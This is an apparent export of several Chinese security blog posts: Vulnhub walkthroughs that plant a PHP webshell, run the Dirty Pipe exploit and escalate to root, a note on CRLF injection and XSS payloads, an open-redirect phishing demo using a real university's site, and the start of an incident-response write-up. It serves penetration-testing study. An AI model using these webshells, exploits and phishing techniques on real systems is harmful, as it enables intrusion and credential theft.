src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2361096-20220320214940388-984674361.png" alt="Img"></p><p>应该是因为没有这几个文件才导致我们的文件无法正常运行，所以我们只需要创建这几个文件就可以了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch /dev/shm/kHgTFI5G</span><br><span class="line">touch /dev/shm/Zw7bV9U5</span><br><span class="line">touch /tmp/kcM0Wewe</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241018215437977.png" alt="image-20241018215437977"></p><p>成功执行，root用户密码是Earth，我们登录即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241018220009341.png" alt="image-20241018220009341"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241018220244428.png" alt="image-20241018220244428"></p><p>第二个flag也成功找到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root_flag_b0da9554d29db2117b02aa8b66ec492e]</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>异或脚本编写</li><li>反弹shell绕过</li><li>suid提权</li><li>nc进行文件传输</li><li>strace进行文件分析</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 红蓝对抗 </category>
          
          <category> 红队入侵 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战打靶 </tag>
            
            <tag> 红队技战法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub打靶-matrix_breakout_2_morpheus</title>
      <link href="/post/f24d9297.html"/>
      <url>/post/f24d9297.html</url>
      
        <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>靶机下载：<code>https://pan.baidu.com/s/1kz6ei5hNomFK44p1QT0xzQ?pwd=y5qh</code>提取码: y5qh</p><p>攻击机器：192.168.20.128（Windows操作系统）</p><p>靶机：192.168.20.0/24</p><p>目标：获取2个flag+root权限</p><h1 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>信息收集三板斧，nmap扫描+目录扫描，这里就不再赘述，直接贴结果，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241016134758116.png" alt="image-20241016134758116"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241016134824495.png" alt="image-20241016134824495"></p><p>由nmap的结果，我们可以知道靶机IP为<code>192.168.20.133</code>，开放的端口为<code>22,80,81</code>，我们首先对80端口进行探测，浏览器访问80端口，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241016135109187.png" alt="image-20241016135109187"></p><p>页面大致意思就是告诉我们现在对于ssh服务我们不能利用，所以我们得从80端口寻找突破口，进而突破对ssh服务的限制，我们接下来进行路径扫描，这里真的得靠平时积累的字典了，扫到了就是扫到了，没扫到是真的寄了，我们这里使用gobuster进行路径扫描，使用kali自带的目录字典，输入的命令如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.20.133 -x php,txt,jsp,asp -w &quot;C:\Users\Administrator\Desktop\目录字典\directory-list-2.3-medium.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241016140421647.png" alt="image-20241016140421647"></p><p>我们尝试访问<code>graffiti.php</code>，观察一下是否存在漏洞</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241016140640159.png" alt="image-20241016140640159"></p><h2 id="漏洞初探"><a href="#漏洞初探" class="headerlink" title="漏洞初探"></a>漏洞初探</h2><p>看到框框，先想一想是否存在xss漏洞了，我们先尝试最基本的弹窗xss</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241016141024413.png" alt="image-20241016141024413"></p><p>我们发现存在xss漏洞，而且这里有一个惊奇的发现，就是当我无论输入什么东西，都会出现弹窗</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241016141325003.png" alt="image-20241016141325003"></p><p>说明这不是一个简单的反射型xss漏洞，而是一个存储型xss漏洞，而且我们写的东西都会重新出现在php页面中</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241016141603016.png" alt="image-20241016141603016"></p><p>第一个想法是不是把东西全部存储在数据库里，然后再通过数据库全部取出来，我们通过抓包再去看看是什么情况</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241016141945164.png" alt="image-20241016141945164"></p><p>我们发现这里通过POST传参将数据写入一个<code>graffiti.txt</code>文件中，这个时候我们就想能不能写<code>shell</code>了，但是<code>txt</code>并不能执行啊，这个时候我们试着将后面<code>file=graffiti.txt</code>改成<code>file=shell.php</code>，我们试着这样可不可行</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241016142529448.png" alt="image-20241016142529448"></p><p>我们尝试访问<code>shell.php</code>看看是否创建成功</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241016142625735.png" alt="image-20241016142625735"></p><p>我们发现成功创建，接下来我们直接进行反弹shell拿主机权限</p><h2 id="蚁剑连接"><a href="#蚁剑连接" class="headerlink" title="蚁剑连接"></a>蚁剑连接</h2><p>由于我这里反弹shell不成功，所以采用蚁剑进行连接，发现成功连接，第一件事先找flag</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241016145104140.png" alt="image-20241016145104140"></p><p>我们在根目录下找到了一个FLAG.txt文件，我们点开来看看有什么信息</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241016145249398.png" alt="image-20241016145249398"></p><p>这个flag提示我们去找到主机的密码，即我们要进行Linux提权</p><h2 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h2><p>我们首先上传一个脚本，一个非常著名的提权脚本<code>linpeas</code>，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241016150259980.png" alt="image-20241016150259980"></p><p>我们直接通过蚁剑上传我们的脚本文件</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241016150436443.png" alt="image-20241016150436443"></p><p>首先先给这个脚本一个运行权限，通过<code>chmod+x</code>进行权限赋予，然后直接运行这个脚本，不知道为什么蚁剑的终端执行不了这个脚本，我们还是反弹shell试试吧，详细的反弹shell操作可以看上一篇博客<a href="http://www.hackborgeous.top/post/45b9aa4c.html">Vulnhub打靶-admx_new | Borgeousのblog (hackborgeous.top)</a></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241016152130003.png" alt="image-20241016152130003"></p><p>成功上线，我们再执行运行脚本的命令，这里需要注意的是，反弹shell最好反弹到linux主机上，不要用Windows的，不然会乱码，这也是我踩的坑之一</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241016154421698.png" alt="image-20241016154421698"></p><p>我们找到了可以利用的系统漏洞，我们直接下载脚本进行运行即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/imfiver/CVE-2022-0847.git</span><br><span class="line">cd CVE-2022-0847</span><br><span class="line">chmod +x Dirty-Pipe.sh</span><br><span class="line">./Dirty-Pipe.sh</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241016155252302.png" alt="image-20241016155252302"></p><p>成功获取root权限</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241016155406248.png" alt="image-20241016155406248"></p><p>第二个flag也成功获取</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 红蓝对抗 </category>
          
          <category> 红队入侵 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战打靶 </tag>
            
            <tag> 红队技战法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub打靶-admx_new</title>
      <link href="/post/45b9aa4c.html"/>
      <url>/post/45b9aa4c.html</url>
      
        <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>靶机下载：<code>https://pan.baidu.com/s/1n__Xi5zpDxtNvuR_Be-2Dg?pwd=76wa</code>提取码: 76wa </p><p>攻击机器：192.168.20.128（Windows操作系统）</p><p>靶机：192.168.20.0/24</p><p>目标：获取2个flag+root权限</p><p>本次靶机难度较为简单，不涉及内网穿透等内容，是我第一次尝试红队攻击，故在此记录</p><h1 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先我们拿到一个靶机，第一个要做的事情就是进行信息收集，看看靶机是否开放了某些具有漏洞的服务可以让我们进行渗透，由于靶机是部署在我虚拟机下的，所以我可以通过我的攻击机器知道靶机的网段是192.168.20.0/24，所以我们首先使用nmap扫描网段下存活的所有主机</p><p>执行命令<code>nmap -sn 192.168.20.0/24</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241015140918503.png" alt="image-20241015140918503"></p><p>192.168.20.1是我自己主机的IP地址，192.168.20.2是网关出口，192.168.20.128是我的攻击主机，所以这里存疑的只有192.168.20.132以及192.168.20.254，所以我们直接扫描这两个IP地址开放的端口来进行进一步确认</p><p>执行命令<code>nmap 192.168.20.132 192.168.20.254</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/34d4c7430684f506686fb27ca4180e4e.png" alt="34d4c7430684f506686fb27ca4180e4e"></p><p>我们可以进一步确定我们靶机的IP是192.168.20.132，且开放了80端口作为web服务，我们接着利用浏览器访问其80端口，看看能不能发现什么</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241015141853169.png" alt="image-20241015141853169"></p><p>这一看就是要进行路径扫描，我们直接使用diresearch进行路径扫描，执行命令<code>python dirsearch.py -u http://192.168.20.132/</code>，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241015142508268.png" alt="image-20241015142508268"></p><p>我们发现有wordpress的登录后台，我们尝试访问即可，访问界面如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241015142651027.png" alt="image-20241015142651027"></p><p>一开始我以为是我虚拟机的浏览器禁用了js，后来换成我主机的浏览器进行访问，发现还是这个样子，我接下来查看我浏览器配置的插件发现了关键信息，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241015142940386.png" alt="image-20241015142940386"></p><p>我的findsomething插件显示的当前页面的IP地址为192.168.159.145，这显然和web页面的真实IP地址不一样，所以这里肯定是进行了IP替换，我们要通过bp进行代理，来重新更换回来，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/43a9b48e13fffd4e50fb14edb7690eb3.png" alt="43a9b48e13fffd4e50fb14edb7690eb3"></p><p>我们在BP中进行如下设置之后，把浏览器的代理切换为BP进行代理，然后我们再尝试访问，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241015143459459.png" alt="image-20241015143459459"></p><p>我们可以发现页面访问正常，说明我们成功绕过了第一个限制</p><h2 id="后台密码爆破"><a href="#后台密码爆破" class="headerlink" title="后台密码爆破"></a>后台密码爆破</h2><p>渗透思路很清晰，我们能够成功访问到后台登录界面，现在唯一要做的就是爆破出登录的账号密码进行登录即可，这个时候就要体现出字典的强大性了，由于刚刚后台路径扫描的过程中出现了<code>/tools/adminer.php</code>，所以我们不妨猜测账号为admin，爆破页面如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241015145142744.png" alt="image-20241015145142744"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/35afb990a93fe7c2acb4dc02bc3ce881.png" alt="35afb990a93fe7c2acb4dc02bc3ce881"></p><p>我们发现这里有唯一一个状态码是重定向的，所以这个密码应该是正确的，所以密码为adam14，我们尝试登录，发现可以登录上去</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241015144824442.png" alt="image-20241015144824442"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先我们可以看到wordpress的版本号，wordpress的版本号为6.6.2，我们尝试搜索其历史漏洞。看看是否爆出过历史漏洞，我们发现存在CVE-2020-25213远程代码执行的漏洞，所以我们尝试上传PHP脚本以进行任意命令执行，其中我们的后门代码如下所示</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> * Plugin Name:Webshell</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> * Plugin URI:https//borgeous.github.io</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> * Description:WP Webshell for Pentest</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> * Version:1.0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> * Author:borgeous</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> * Author URI:https://borgeous.github.io</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> * License:https://borgeosus.github.io</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里要注意的是，一定不能缺少上面的说明部分，这是wordpress插件的固定格式，且要压缩成zip文件包进行上传</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241015151347533.png" alt="image-20241015151347533"></p><p>我们在激活插件后尝试访问如下地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.20.132/wordpress/wp-content/plugins/shell.php?pass=whoami</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241015152021795.png" alt="image-20241015152021795"></p><p>我们发现可以成功执行任意命令</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>既然可以成功执行任意命令，那么接下来就是进行反弹shell拿主机命令执行权限</p><p>首先我们运行主机的nc进行监听9001端口</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241015152424490.png" alt="image-20241015152424490"></p><p>紧接着我们用反弹shell生成器进行生成反弹shell，因为绝大部分靶机都有python环境，所以我们尝试使用python来进行反弹shell，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241015152814279.png" alt="image-20241015152814279"></p><p>我们将该命令进行执行，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241015152907881.png" alt="image-20241015152907881"></p><p>我们发现靶机已经成功上线，成功获取权限，我们此时切换到家目录，我们发现存在wpadmin用户，我们进入wpadmin用户，可以发现存在local.txt文件，我们尝试读取，但是发现权限不够，所以我们尝试切换wpadmin用户，密码试着使用adam14，发现成功进去，并成功获取第一个flag值</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241015154723460.png" alt="image-20241015154723460"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241015154927110.png" alt="image-20241015154927110"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Ava&#125;</span><br></pre></td></tr></table></figure><h2 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h2><p>我们首先执行<code>sudo -l</code>命令列出当前用户在使用<code>sudo</code>命令时可以执行的命令列表</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241015160046825.png" alt="image-20241015160046825"></p><p>我们发现用户<code>wpadmin</code>可以无需输入密码（NOPASSWD）以root用户的权限执行<code>/usr/bin/mysql</code>命令，连接到名为<code>wordpress</code>的数据库，我们尝试执行即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241015160253986.png" alt="image-20241015160253986"></p><p>需要数据库密码，我们尝试密码复用，因为在真实环境中，会出现很多密码复用的情况，所以我们依然尝试adam14</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241015161935661.png" alt="image-20241015161935661"></p><p>我们可以发现成功进入，然后我们利用<code>mysql</code>的<code>system</code>命令来帮助我们直接以<code>root</code>身份执行系统命令（<code>\ !</code>是<code>mysql</code>命令中<code>system</code>的简写）。然后我们直接利用 <code>\!</code>来使用 <code>/bin/bash</code>命令以 <code>root</code>的身份来使用 <code>shell</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241015162510800.png" alt="image-20241015162510800"></p><p>成功获得<code>root</code>权限，且获得第二个flag</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241015162619737.png" alt="image-20241015162619737"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241015162715907.png" alt="image-20241015162715907"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Adam&#125;</span><br></pre></td></tr></table></figure><p>至此全部解决，我们可以尝试爆破root的密码，因为我们已经拿到了root权限，所以可以访问shadow文件，我们尝试使用john进行爆破</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241015163928669.png" alt="image-20241015163928669"></p><p>发现密码本中没有该root密码，我们尝试修改root密码以维持权限</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241015164026156.png" alt="image-20241015164026156"></p><p>成功拿到主机权限</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241015164057959.png" alt="image-20241015164057959"></p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 红蓝对抗 </category>
          
          <category> 红队入侵 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战打靶 </tag>
            
            <tag> 红队技战法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防-通用漏洞-CRLF注入&amp;URL重定向&amp;资源处理拒绝服务</title>
      <link href="/post/fb3d5737.html"/>
      <url>/post/fb3d5737.html</url>
      
        <content type="html"><![CDATA[<h1 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h1><p>CRLF注入漏洞发生在应用程序未能正确过滤用户输入中的回车（CR，\r，%0d）和换行（LF，\n，%0a）字符时。在HTTP协议中，HTTP头部字段和正文之间通过一个CRLF序列分隔，每个头部字段之间也通过CRLF序列分隔。攻击者可以利用这一点，在响应头中插入新的头部字段，或者在响应正文中插入内容。</p><p>接下来举个例子，当我们请求www.baidu.com的时候，请求头是这样的：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line"> </span><br><span class="line">Host：www.baidu.com</span><br></pre></td></tr></table></figure><p>当我们请求www.baidu.com/search的时候，请求头会变成这样：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /search HTTP/1.1</span><br><span class="line"> </span><br><span class="line">Host：www.baidu.com</span><br></pre></td></tr></table></figure><p>当我们恶意插入换行符号且网站并没对换行符号过滤的时候，就可以将请求写成www.baidu.com/search%0Host:www.hack.com，这样我们的请求头就会变成</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /search HTTP/1.1</span><br><span class="line">Host: www.hack.com</span><br><span class="line">Host：www.baidu.com</span><br></pre></td></tr></table></figure><p>这时候就会出现两种情况：</p><p>1.访问www.hack.com</p><p>2.报错</p><p>接下来我们就用一个实际靶场案例来进行演示，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241013164311734.png" alt="image-20241013164311734"></p><p>我们进行抓包，抓包情况如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241013164909507.png" alt="image-20241013164909507"></p><p>然后我们进行修改，加入<code>%0aSet-cookie:JSPSESSID%3Dhacker</code>，然后再进行发送</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/7c6c19d404b68cacb1e52bc30307ee31.png" alt="7c6c19d404b68cacb1e52bc30307ee31"></p><p>我们可以看到成功被添加了一个Cookie值，当然，用的最多的是配合xss漏洞，我们直接在页面上生成一个xss语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0d%0a%0d%0a&lt;img src=1 οnerrοr=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241013165505822.png" alt="image-20241013165505822"></p><p>这里也介绍一个批量测试工具：<code>https://github.com/dwisiswant0/crlfuzz/releases</code>，访问这个地址即可，可以获取crlfuzz测试工具</p><h1 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h1><p>URL重定向就更为简单了，即在访问的URL中，会出现类似于<code>/?url=xxxx</code>的形式，这个时候就会直接跳转到后面所指向的url地址</p><p>例如，在以下url中，我们尝试访问原有url，会自动跳转到后面所指向的url地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.njau.edu.cn/njau_db/weburl.php?resource_id=189&amp;resource_name=IET英国工程技术学会&amp;urlnames=资源地址&amp;url=http%3A%2F%2Fwww.ietdl.org%2F</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241013172003946.png" alt="image-20241013172003946"></p><p>我们尝试将后面的修改为www.baidu.com，观察是否会自动跳转到我们的百度</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241013172136592.png" alt="image-20241013172136592"></p><p>成功跳转，所以存在url重定向漏洞，至于这个漏洞有啥用，我们的登录验证一般都存在url重定向，我们只需将对应的url替换成我们制作的钓鱼网页，就可以实现盗取用户的登录账号密码，所以危害还是蛮大的，这也是为什么现在大家都把登录验证方式改成了验证码登录吧，会稍微安全一点</p><p>我们这里使用Google语法找到一个具有该性质的登录网站，经过测试，存在url重定向的漏洞，我们同时制作一个钓鱼网页进行替换</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Google语法：</span><br><span class="line">inurl:login url=http:// edu.cn</span><br><span class="line">url地址:</span><br><span class="line">https://db.njau.edu.cn/njau_db/weburl.php?resource_id=300&amp;resource_name=%E8%AE%BA%E6%96%87%E6%94%B6%E5%BD%95%E5%BC%95%E8%AF%81%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%88%E5%8F%82%E8%80%83%E5%92%A8%E8%AF%A2%E9%83%A8%E4%B8%93%E7%94%A8%EF%BC%89&amp;urlnames=&amp;url=http%3A%2F%2Flwyz.yun.smartlib.cn%2Fwidgets%2Flogin%2F</span><br></pre></td></tr></table></figure><p>我们这里使用kali自带的setoolkit工具进行钓鱼网页的制作，具体操作步骤如下所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.setoolkit</span><br><span class="line">2.1</span><br><span class="line">3.2</span><br><span class="line">4.3</span><br><span class="line">5.2</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241013175526513.png" alt="image-20241013175526513"></p><p>如下就是我们克隆出来的钓鱼网页，我们进行替换即可，替换后的url如下所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://db.njau.edu.cn/njau_db/weburl.php?resource_id=300&amp;resource_name=%E8%AE%BA%E6%96%87%E6%94%B6%E5%BD%95%E5%BC%95%E8%AF%81%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%88%E5%8F%82%E8%80%83%E5%92%A8%E8%AF%A2%E9%83%A8%E4%B8%93%E7%94%A8%EF%BC%89&amp;urlnames=&amp;url=http://192.168.20.129/</span><br></pre></td></tr></table></figure><p>访问后直接跳转到我们的钓鱼网页，然后受害者就会在上面输入关键信息，我们就可以在kali上获取关键信息</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241013175831510.png" alt="image-20241013175831510"></p><p>这就是一次完整的利用url重定向的社会工程学攻击</p><h1 id="WEB拒绝服务"><a href="#WEB拒绝服务" class="headerlink" title="WEB拒绝服务"></a>WEB拒绝服务</h1><p>这个漏洞原理也比较简单，但是没有什么利用价值，存在破坏价值，当我们上传的资源的大小是由我们决定的时候，我们就可以输入无限大的数值以造成资源的占有</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241013180158563.png" alt="image-20241013180158563"></p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB攻防 </category>
          
          <category> 业务逻辑 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CRLF注入 </tag>
            
            <tag> URL重定向 </tag>
            
            <tag> 资源处理拒绝服务 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一届“帕鲁杯”应急响应wp</title>
      <link href="/post/6e024654.html"/>
      <url>/post/6e024654.html</url>
      
        <content type="html"><![CDATA[<p>帕鲁杯应急响应是我做过的第一个模拟真实生产场景的应急响应题目，以往做过的都是单个靶机，这一次首次挑战具有拓扑网络结构的应急响应题，更考验综合能力以及对于各个系统的应急响应，所以写下这篇wp以作记录，下面是对于该题的描述</p><p>其网络拓扑结构如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009102209981.png" alt="image-20241009102209981"></p><p>其相关资产情况如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009102327111.png" alt="image-20241009102327111"></p><h1 id="签到-提交-堡垒机的flag标签的值"><a href="#签到-提交-堡垒机的flag标签的值" class="headerlink" title="签到 提交:[堡垒机的flag标签的值]"></a>签到 提交:[堡垒机的flag标签的值]</h1><p>第一题是签到题，比较简单，我们直接打开<a href="http://192.168.20.123:8080/core/auth/login/">JumpServer 开源堡垒机</a>并登录进去</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/56ce3b6aa55934a3db78a037330408b0.png" alt="56ce3b6aa55934a3db78a037330408b0"></p><p>找到标签列表，里面有遗留下来的flag值，故签到题的答案为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[BrYeaVj54009rDIZzu4O]</span><br></pre></td></tr></table></figure><h1 id="提交攻击者第一次登录时间-格式为-2024-00-00-00-00-00"><a href="#提交攻击者第一次登录时间-格式为-2024-00-00-00-00-00" class="headerlink" title="提交攻击者第一次登录时间 格式为:[2024/00/00/00:00:00]"></a>提交攻击者第一次登录时间 格式为:[2024/00/00/00:00:00]</h1><p>我们查看登录日志，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/0a4aa3823aa0ecf39828f8b2f22780ac.png" alt="0a4aa3823aa0ecf39828f8b2f22780ac"></p><p>LAN表示从内网登录，所以这个登录记录是最可疑的，我们直接提交本次记录的时间，可以发现是正确的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[2024/04/11 14:21:18]</span><br></pre></td></tr></table></figure><h1 id="提交攻击者源IP-格式为-0-0-0-0"><a href="#提交攻击者源IP-格式为-0-0-0-0" class="headerlink" title="提交攻击者源IP 格式为:[0.0.0.0]"></a>提交攻击者源IP 格式为:[0.0.0.0]</h1><p>查看登录日志，我们可以发现192.168.1.4是登录最多的IP地址，所以我们直接提交192.168.1.4即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[192.168.1.4]</span><br></pre></td></tr></table></figure><h1 id="提交攻者使用的cve编号-格式为-CVE-0000-0000"><a href="#提交攻者使用的cve编号-格式为-CVE-0000-0000" class="headerlink" title="提交攻者使用的cve编号 格式为:[CVE-0000-0000]"></a>提交攻者使用的cve编号 格式为:[CVE-0000-0000]</h1><p>由于攻击者成功登录了我们的堡垒机，所以我们去搜索一下Jumpserver的历史漏洞</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009104351975.png" alt="image-20241009104351975"></p><p>我们发现CVE-2024-29201为远程RCE漏洞，所以我们猜测大概率就是用这个cve打进我们的堡垒机的，所以我们直接提交对应的编号，如下所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[CVE-2024-29201]</span><br></pre></td></tr></table></figure><h1 id="提交攻击者留着web服务器上的恶意程序的32位小写md5-格式为-xxxxxx"><a href="#提交攻击者留着web服务器上的恶意程序的32位小写md5-格式为-xxxxxx" class="headerlink" title="提交攻击者留着web服务器上的恶意程序的32位小写md5 格式为:[xxxxxx]"></a>提交攻击者留着web服务器上的恶意程序的32位小写md5 格式为:[xxxxxx]</h1><p>由于我们没有web服务器的密码，所以这里要用到diskgenius进行内存取证，我们首先将webserver的磁盘映像复制一份出来，然后使用diskgenius打开，如下所示</p><p><img 